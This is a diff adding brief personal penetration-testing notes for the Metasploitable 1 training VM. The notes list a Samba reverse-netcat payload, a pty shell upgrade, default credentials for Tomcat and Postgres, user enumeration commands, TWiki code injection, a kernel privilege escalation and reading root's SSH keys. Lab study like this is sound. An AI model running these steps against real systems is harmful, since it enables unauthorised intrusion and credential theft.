@@ -1,0 +1,29 @@
+### METASPLOITABLE 1 ###
+
+# Samba vulnerability
+-set PAYLOAD cmd/unix/reverse_netcat
+-python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Tomcat
+-tomcat default creds
+
+# Privilege Escalation
+linux kernel exploit (udev link)
+
+# mySQL database
+postgres sql vuln (default creds)
+
+# Web App
+dirbuster the port 80 (dircbuster or dirb)
+## More ways to PWN!! ##
+-enum4linux to enumerate users
+-!! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > userlist
+-smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 > smtp_users
+-cat smtp_users | grep exists | cut -d" " -f2 >> users
+-linux command: cut
+-twikidblib informational disclosure
+-twiki php code injection / execution
+-low priv shell -> look for ssh keys!
+-ls -lsart /root/.ssh
+-cat /root/.ssh/authorized_keys
+grep -lr
